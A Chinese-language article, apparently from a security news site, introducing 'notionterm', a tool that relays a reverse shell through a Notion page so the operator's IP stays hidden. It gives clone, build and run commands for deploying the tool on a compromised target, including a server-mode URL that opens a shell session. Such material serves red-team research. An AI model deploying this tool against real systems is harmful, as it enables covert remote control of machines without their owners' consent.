![](https://image.3001.net/images/20220629/1656434245_62bb2e45799567771b7d0.png!small)  

## 关于notionterm

notionterm是一款功能强大的反向Shell嵌入工具，在该工具的帮助下，广大研究人员可以轻松向一个Notion页面中嵌入反向Shell。

## 工具特性

> 1、可以在反向Shell中隐藏我们的IP地址（研究人员和目标计算机之间没有进行直接交互，Notion将作为代理来托管反向Shell）；
>
> 2、支持在报告中插入演示和PoC；
>
> 3、高可用性和可共享的反向Shell（桌面、浏览器、手机）；
>
> 4、支持加密Shell和带有身份验证功能的远程Shell；

## 工具要求

> Notion软件和API密钥；
>
> 允许目标设备通过HTTP通信连接与Notion域名交互；
>
> 在目标设备上能够实现远程代码执行；

## 工具安装

由于notionterm是要在目标设备上运行的，因此我们也必须要在目标设备上安装和构建notionterm。

因此，首先我们需要根据目标系统来设置env变量：

    
    
    GOOS=[windows/linux/darwin]

### 简单构建

    
    
    git clone https://github.com/ariary/notionterm.git && cd notionterm
    
    GOOS=$GOOS go build notionterm.go

此时我们需要设置API密钥和Notion页面URL，这里可以通过NOTION_TOKEN和NOTION_PAGE_URL这两个env变量来设置，或者通过--token和--page-url这两个参数来设置。

### 完整构建

直接将Notion
API令牌和Notion页面URL地址嵌入到代码中。注意，这种场景下任何能够访问源代码的人都能够查看到令牌。出于安全因素考虑，大家请不要随意分享代码，并且使用后记得删除。

设置对应的env变量：

    
    
    export NOTION_PAGE_URL=[NOTION_PAGE_URL]
    
    export NOTION_TOKEN=[INTEGRATION_NOTION_TOKEN]

接下来，运行下列代码完成项目构建：

    
    
    git clone https://github.com/ariary/notionterm.git && cd notionterm
    
    ./static-build.sh $NOTION_PAGE_URL $NOTION_TOKEN $GOOS go build notionterm.go

## 工具运行

我们有三种方法来运行notionterm。

### 普通模式

打开命令行终端，然后运行下列命令：

    
    
    notionterm [flags]

### 服务器模式

将notionterm 嵌入到任何页面：

    
    
    notionterm --server [flags]

下列命令可以将包含了页面ID的URL嵌入进去，并开启一个Shell会话：

    
    
    https://[TARGET_URL]/notionterm?url=[NOTION_PAGE_ID]

### 轻量级模式

该模式下，工具只会从目标设备向Notion页面发送HTTP流量：

    
    
    notionterm light [flags]

## 工具使用演示

![](https://image.3001.net/images/20220629/1656434320_62bb2e90a1cfbf43ac9ef.gif)

![](https://image.3001.net/images/20220629/1656434339_62bb2ea33a7bffaa1d39c.gif)

![](https://image.3001.net/images/20220629/1656434357_62bb2eb59b21dcc2838a3.gif)

## 许可证协议

本项目的开发与发布遵循[
_Unlicense_](https://github.com/ariary/notionterm/blob/main/LICENSE)授权协议。

## 项目地址

 **notionterm** ：【[ _GitHub传送门_](https://github.com/ariary/notionterm)】

## 参考资料

> [ _https://www.notion.so/_](https://www.notion.so/)
>
> [ _https://github.com/ariary/tacos_](https://github.com/ariary/tacos)
>
> [
> _https://github.com/mttaggart/OffensiveNotion_](https://github.com/mttaggart/OffensiveNotion)
>
> [
> _https://github.com/ariary/Notionion_](https://github.com/ariary/Notionion)

